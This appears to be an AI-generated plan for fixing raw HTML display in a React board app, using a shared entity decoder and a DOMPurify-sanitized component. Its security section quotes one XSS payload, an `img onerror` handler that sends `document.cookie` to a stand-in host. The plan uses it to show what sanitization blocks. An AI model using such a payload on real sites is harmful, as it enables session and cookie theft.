# HTML Rendering Fix - Comprehensive Implementation Plan

## 🔴 Critical Finding

After deep analysis of your codebase, I found **multiple components rendering `{padlet.content}` directly as plain text**, which causes raw HTML tags like `<p>...</p>` to display literally.

---

## 📊 Components Audit

### ✅ Already Fixed (using proper HTML rendering)
| Component | Status | Notes |
|-----------|--------|-------|
| `PostCardContent.tsx` | ✅ Fixed | Has `decodeHtmlEntities`, `looksLikeHtml`, uses `dangerouslySetInnerHTML` |
| `ContainerChildPreviewCard.tsx` | ✅ Fixed | Dedicated preview with HTML decoding |
| `RowColumnContainerCard.tsx` | ✅ Fixed | Uses `ContainerChildPreviewCard` |
| `ContainerCardPreview.tsx` | ✅ Fixed | Uses `<PostCardContent padlet={p as any} />` |
| `ContainerCardPreviewFull.tsx` | ✅ Fixed | Uses `<PostCardContent padlet={p as any} />` |
| `CardPreview.tsx` (isCardView) | ✅ Fixed | Uses `dangerouslySetInnerHTML={{ __html: content }}` |

### ❌ BROKEN - Rendering `{padlet.content}` directly
| File | Line | Code Snippet |
|------|------|--------------|
| `lib/collabboard/layouts/ColumnsLayout.tsx` | 359 | `<p className="text-xs text-gray-600 line-clamp-2">{item.content}</p>` |
| `lib/collabboard/layouts/FreeformLayout.tsx` | 379 | `{padlet.content}` |
| `lib/collabboard/layouts/GridLayout.tsx` | 271 | `{padlet.content}` |
| `components/canvas/WallCanvas.tsx` | 293 | `{padlet.content}` |
| `components/canvas/RowCanvas.tsx` | 221 | `{padlet.content && <p className="...">{padlet.content}</p>}` |
| `components/canvas/RowCanvas.tsx` | 326 | `{padlet.content}` |
| `components/layouts/WallLayout.tsx` | 36 | `<p className="text-gray-600">{padlet.content}</p>` |

---

## 🔍 Step-by-Step Diagnostic Procedure

### Step A: Prove Which Component Is Rendering

Add a **loud visual marker** to identify which component is actually rendering the preview you're seeing:

```tsx
// In ContainerChildPreviewCard.tsx - add at the top of the return
return (
    <div className={`relative rounded-lg border bg-white shadow-sm ${className ?? ""}`}>
        {/* DEBUG MARKER - REMOVE AFTER TESTING */}
        <div className="absolute top-0 right-0 bg-neon-green text-black text-[8px] px-1 z-50">
            CCPC
        </div>
        {/* ... rest of component */}
    </div>
);
```

Or add console logging:

```tsx
// At the top of the component function
console.log("[ContainerChildPreviewCard] Rendering:", padlet.id, padlet.type, padlet.content?.substring(0, 50));
```

**If you DON'T see this marker/log**, then your UI is coming from a different component path!

### Step B: Search for All Raw Content Renders

Use VS Code search (Ctrl+Shift+F) with these patterns:

```
{padlet.content}
{child.content}
{item.content}
{p.content}
String(padlet.content)
```

Every match is a potential bug location.

### Step C: Debug at the Render Point

Add this debug block right where content is rendered:

```tsx
// Debug block - add before rendering content
console.log("=== CONTENT DEBUG ===");
console.log("typeof content:", typeof padlet.content);
console.log("first 100 chars:", String(padlet.content).substring(0, 100));
console.log("contains <p>:", String(padlet.content).includes("<p"));
console.log("contains &lt;p:", String(padlet.content).includes("&lt;p"));
console.log("contains &amp;lt;:", String(padlet.content).includes("&amp;lt;"));
```

---

## 🛠️ Implementation Steps

### 1. Create a Shared HTML Utility (NEW FILE)

Create `lib/html-utils.ts`:

```typescript
/**
 * Decodes HTML entities like &lt; back to <
 * Handles SSR by using a pure string-based approach
 * Also handles double-encoding (&amp;lt; → &lt; → <)
 */
export function decodeHtmlEntities(text: string): string {
    if (!text) return "";
    
    let result = text;
    let previousResult = "";
    let iterations = 0;
    const maxIterations = 3; // Prevent infinite loops
    
    // Keep decoding until stable (handles double/triple encoding)
    while (result !== previousResult && iterations < maxIterations) {
        previousResult = result;
        iterations++;
        
        // Use pure string replacement for SSR compatibility
        result = result
            .replace(/&amp;/g, "&")
            .replace(/&lt;/g, "<")
            .replace(/&gt;/g, ">")
            .replace(/&quot;/g, '"')
            .replace(/&#39;/g, "'")
            .replace(/&nbsp;/g, " ");
    }
    
    return result;
}

/**
 * Detects if a string contains HTML (raw or entity-encoded)
 * 
 * IMPORTANT: We use a strict allowlist of known HTML tags to avoid
 * false positives from user text like "<3" or "a < b > c"
 */
export function looksLikeHtml(raw: string): boolean {
    if (!raw) return false;
    const s = raw.trim();
    
    // Allowlist of tags we actually generate from rich text editors
    // This prevents false positives from user input like "<3" or math expressions
    const knownTags = [
        'p', 'div', 'span', 'br', 'hr',
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
        'ul', 'ol', 'li',
        'strong', 'b', 'em', 'i', 'u', 's', 'strike',
        'a', 'img', 'video', 'audio', 'iframe',
        'table', 'thead', 'tbody', 'tr', 'th', 'td',
        'blockquote', 'pre', 'code',
        'sup', 'sub', 'mark'
    ];
    
    // Check for known HTML tags (case insensitive)
    const tagPattern = new RegExp(`<\\/?(${knownTags.join('|')})(\\s|>|\\/)`, 'i');
    if (tagPattern.test(s)) return true;
    
    // Entity-encoded HTML (these are unambiguous)
    if (s.includes("&lt;") || s.includes("&gt;")) return true;
    if (s.includes("&amp;lt;")) return true; // Double-encoded
    
    return false;
}

/**
 * Safely convert any value to string
 */
export function asStringContent(v: unknown): string {
    if (typeof v === "string") return v;
    if (v == null) return "";
    try {
        return String(v);
    } catch {
        return "";
    }
}

/**
 * Normalize type to lowercase string
 */
export function normalizeType(t: unknown): string {
    return String(t ?? "").trim().toLowerCase();
}
```

### 2. Create a Reusable SafeHtmlContent Component (NEW FILE)

Create `components/collabboard/SafeHtmlContent.tsx`:

```tsx
"use client";

import React, { useMemo } from "react";
import DOMPurify from "dompurify"; // npm install dompurify @types/dompurify
import { decodeHtmlEntities, looksLikeHtml, asStringContent } from "@/lib/html-utils";

interface SafeHtmlContentProps {
    content: unknown;
    className?: string;
    lineClamp?: number;
    fallback?: React.ReactNode;
}

/**
 * Safely renders content that may contain HTML.
 * - Decodes HTML entities (including double-encoded)
 * - Detects if content is HTML using strict tag allowlist
 * - Sanitizes HTML to prevent XSS attacks
 * - Falls back to plain text for non-HTML content
 */
export default function SafeHtmlContent({
    content,
    className = "",
    lineClamp,
    fallback = null,
}: SafeHtmlContentProps) {
    const raw = asStringContent(content);
    
    const { sanitizedHtml, shouldRenderHtml } = useMemo(() => {
        const decoded = decodeHtmlEntities(raw);
        const shouldRenderHtml = looksLikeHtml(raw) || looksLikeHtml(decoded);
        
        // SECURITY: Always sanitize before inserting HTML
        // DOMPurify removes dangerous elements/attributes (scripts, onerror, etc.)
        const sanitizedHtml = shouldRenderHtml 
            ? DOMPurify.sanitize(decoded, {
                ALLOWED_TAGS: [
                    'p', 'div', 'span', 'br', 'hr',
                    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
                    'ul', 'ol', 'li',
                    'strong', 'b', 'em', 'i', 'u', 's',
                    'a', 'img', 'blockquote', 'pre', 'code',
                    'table', 'thead', 'tbody', 'tr', 'th', 'td',
                    'sup', 'sub', 'mark'
                ],
                ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'style', 'target', 'rel'],
                ALLOW_DATA_ATTR: false,
              })
            : decoded;
        
        return { sanitizedHtml, shouldRenderHtml };
    }, [raw]);
    
    if (!raw && fallback) {
        return <>{fallback}</>;
    }
    
    const style: React.CSSProperties = lineClamp
        ? {
            display: "-webkit-box",
            WebkitLineClamp: lineClamp,
            WebkitBoxOrient: "vertical",
            overflow: "hidden",
            wordWrap: "break-word",
            overflowWrap: "break-word",
        }
        : {
            wordWrap: "break-word",
            overflowWrap: "break-word",
        };
    
    if (shouldRenderHtml) {
        return (
            <div
                className={`prose prose-sm max-w-none ${className}`}
                style={style}
                dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
            />
        );
    }
    
    return (
        <div className={className} style={style}>
            {raw}
        </div>
    );
}
```

> **⚠️ Security Note**: Install DOMPurify: `npm install dompurify @types/dompurify`
> 
> If you prefer server-side sanitization, sanitize content before saving to the database and skip the client-side DOMPurify call.

### 3. Fix Each Broken Component

#### Fix: `lib/collabboard/layouts/ColumnsLayout.tsx` (Line ~359)

```tsx
// BEFORE
<p className="text-xs text-gray-600 line-clamp-2">{item.content}</p>

// AFTER
import SafeHtmlContent from "@/components/collabboard/SafeHtmlContent";
// ...
<SafeHtmlContent 
    content={item.content} 
    className="text-xs text-gray-600" 
    lineClamp={2} 
/>
```

#### Fix: `lib/collabboard/layouts/FreeformLayout.tsx` (Line ~379)

```tsx
// BEFORE
<p className="text-xs flex-1 overflow-hidden leading-relaxed">
    {padlet.content}
</p>

// AFTER
import SafeHtmlContent from "@/components/collabboard/SafeHtmlContent";
// ...
<SafeHtmlContent 
    content={padlet.content} 
    className="text-xs flex-1 overflow-hidden leading-relaxed" 
    lineClamp={4}
/>
```

#### Fix: `components/canvas/WallCanvas.tsx` (Line ~293)

```tsx
// BEFORE
{padlet.content && (
    <p className="text-sm text-gray-700 line-clamp-4">
        {padlet.content}
    </p>
)}

// AFTER
import SafeHtmlContent from "@/components/collabboard/SafeHtmlContent";
// ...
{padlet.content && (
    <SafeHtmlContent 
        content={padlet.content} 
        className="text-sm text-gray-700" 
        lineClamp={4}
    />
)}
```

#### Fix: `components/canvas/RowCanvas.tsx` (Lines ~221 and ~326)

```tsx
// BEFORE (line 221)
{padlet.content && <p className="text-xs text-gray-500">{padlet.content}</p>}

// AFTER
import SafeHtmlContent from "@/components/collabboard/SafeHtmlContent";
// ...
{padlet.content && (
    <SafeHtmlContent content={padlet.content} className="text-xs text-gray-500" />
)}

// BEFORE (line 326)
{padlet.content && (
    <p className="text-sm text-gray-700 line-clamp-4">
        {padlet.content}
    </p>
)}

// AFTER
{padlet.content && (
    <SafeHtmlContent content={padlet.content} className="text-sm text-gray-700" lineClamp={4} />
)}
```

---

## ⚠️ Edge Cases & Security Considerations

### 1. Double-Encoded HTML (`&amp;lt;p&amp;gt;`)

**Problem**: Content saved through multiple layers may be double or triple encoded.

**Symptom**: Debug log shows `&amp;lt;p` in raw content.

**Solution**: The `decodeHtmlEntities` function in `lib/html-utils.ts` above handles this by decoding iteratively until stable.

### 2. SSR / Server Components

**Problem**: Your current `decodeHtmlEntities` uses `document.createElement("textarea")`, which doesn't exist during SSR.

**Symptom**: `typeof document` is `undefined` in the console.

**Solution**: The pure string-based decoder in `lib/html-utils.ts` above works in both client and server environments.

### 3. Type Mismatch (content is not a string)

**Problem**: `padlet.content` might be `null`, `undefined`, or even an object.

**Symptom**: `TypeError: Cannot read property 'trim' of null`

**Solution**: The `asStringContent` helper safely converts any value to a string.

### 4. False Positives (user types `<3` or `a < b > c`)

**Problem**: Naive HTML detection (`/<[a-z]/i`) treats user text as HTML.

**Symptom**: User's message `I love you <3` disappears or renders weirdly.

**Solution**: The updated `looksLikeHtml` uses a strict allowlist of known HTML tags. Only tags like `<p>`, `<strong>`, `<ul>` are treated as HTML. Random angle brackets are left alone.

### 5. XSS Security Vulnerability

**Problem**: `dangerouslySetInnerHTML` with user content = potential XSS attack vector.

**Symptom**: Malicious user injects `<script>` or `<img onerror="...">` and executes arbitrary code.

**Solution**: 
- **Client-side**: Use DOMPurify to sanitize before rendering (included in `SafeHtmlContent`)
- **Server-side** (better): Sanitize content before saving to database

**Example attack prevented**:
```html
<!-- Attacker tries to inject -->
<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">

<!-- DOMPurify removes the onerror attribute -->
<img src="x">
```

### 6. Hidden Renderer Components (The "Still Broken" Gotcha)

**Problem**: You fix all the obvious files, but a DnD ghost, canvas overlay, minimap, or compact preview still renders raw content.

**Symptom**: "I fixed everything and it still happens"

**Solution**: 
- **ALWAYS** keep the debug marker until you visually confirm it appears on the broken card
- Search for these patterns that indicate a hidden renderer:
  - `DndContext`, `useDraggable`, `useDroppable`
  - `ghost`, `overlay`, `preview`, `thumbnail`, `minimap`
  - `compact`, `summary`, `collapsed`
  - `virtualized`, `windowed`

---

## 📋 Implementation Checklist

### Phase 0: Install Dependencies
- [ ] Run `npm install dompurify @types/dompurify`

### Phase 1: Diagnostic (Do First! DO NOT SKIP!)
- [ ] Add visual marker to `ContainerChildPreviewCard.tsx`
- [ ] **KEEP the marker until you visually confirm it appears on the exact card showing `<p>...</p>`**
- [ ] If marker doesn't appear → you haven't found the real renderer yet, keep searching
- [ ] Add debug logging to check content format at render point
- [ ] Check for double-encoding (`&amp;lt;`)
- [ ] Check for SSR issues (`typeof document === 'undefined'`)

### Phase 2: Create Shared Utilities
- [ ] Create `lib/html-utils.ts` with SSR-safe decoders
- [ ] Create `components/collabboard/SafeHtmlContent.tsx` reusable component
- [ ] Update `PostCardContent.tsx` to use shared utilities
- [ ] Update `ContainerChildPreviewCard.tsx` to use shared utilities

### Phase 3: Fix All Broken Renderers
- [ ] Fix `lib/collabboard/layouts/ColumnsLayout.tsx` (line 359)
- [ ] Fix `lib/collabboard/layouts/FreeformLayout.tsx` (line 379)
- [ ] Fix `lib/collabboard/layouts/GridLayout.tsx` (line 271)
- [ ] Fix `components/canvas/WallCanvas.tsx` (line 293)
- [ ] Fix `components/canvas/RowCanvas.tsx` (lines 221, 326)
- [ ] Fix `components/layouts/WallLayout.tsx` (line 36)

### Phase 4: Hunt for Hidden Renderers
- [ ] Search for DnD ghost/overlay renderers
- [ ] Search for canvas virtualization preview renderers
- [ ] Search for thumbnail/minimap renderers
- [ ] Search for compact/summary card renderers
- [ ] Check any "preview" mode switches

### Phase 5: Verify Backup/Old Files
- [ ] Check `brocken_WallCanvas.tsx` (line 291)
- [ ] Check any other backup files in `old_page_tsx/`, `Neuer Ordner/`, etc.

### Phase 6: Testing
- [ ] Test comment post in main view
- [ ] Test comment post in container preview
- [ ] Test text/note post with rich formatting
- [ ] Test with double-encoded content
- [ ] Test in SSR mode (disable client hydration temporarily)
- [ ] Test user input with `<3` or `a < b` (should NOT be treated as HTML)

---

## ✅ Definition of Done

You are **DONE** when:

### 1. Global Search Returns Zero Matches for Direct Rendering

Run these searches and **all must return 0 matches in UI code** (exclude test files, types, exports):

```
{padlet.content}
{item.content}
{child.content}
{p.content}
String(.*\.content)   (regex)
line-clamp-.*>{.*content}   (regex)
```

### 2. Only These Patterns Exist in UI Code

✅ Acceptable:
```tsx
<SafeHtmlContent content={...} ... />
```

✅ Acceptable (if using shared util + sanitize):
```tsx
<div dangerouslySetInnerHTML={{ __html: sanitizedDecodedContent }} />
```

❌ Unacceptable (causes literal `<p>` rendering):
```tsx
<p>{padlet.content}</p>
<div>{item.content}</div>
{child.content}
```

### 3. Debug Marker Confirms Component Path

- The visual debug marker appears on the **exact card** that was showing `<p>...</p>`
- If you can't see the marker, you haven't found the real renderer

### 4. Visual Verification

- No literal `<p>`, `</p>`, `<strong>`, etc. visible anywhere in the UI
- Rich text formatting (bold, lists, links) renders correctly
- User text containing `<3` or math expressions displays as plain text (not eaten by HTML parser)

---

## 🔄 Quick Reference: Where to Add Import

For any file that currently uses `{padlet.content}` directly, add:

```tsx
import SafeHtmlContent from "@/components/collabboard/SafeHtmlContent";
```

Then replace:
```tsx
// FROM
<p className="...">{padlet.content}</p>

// TO
<SafeHtmlContent content={padlet.content} className="..." lineClamp={N} />
```

---

## 📝 Summary

The issue is **NOT** that `PostCardContent.tsx` is broken — it's that **many other components bypass it** and render `{padlet.content}` directly.

Your fix architecture is correct. The problem is **coverage** — you need to apply the same pattern to every place that renders content.

**The fastest path forward:**

1. **Diagnose first** — prove which component is actually rendering (keep marker until confirmed!)
2. **Install DOMPurify** — `npm install dompurify @types/dompurify`
3. **Create shared utilities** — so you don't duplicate code
4. **Fix each broken path** — using the checklist above
5. **Hunt for hidden renderers** — DnD, virtualization, previews, minimaps
6. **Global search to verify** — zero matches for direct content rendering
7. **Test each scenario** — including edge cases like `<3` and double-encoding

**Remember**: If the debug marker doesn't appear on the broken card, you haven't found the real renderer yet. Keep searching!

---

*Generated: January 26, 2026*
*Updated with: Strict HTML detection, DOMPurify sanitization, Definition of Done, Hidden renderer hunting*
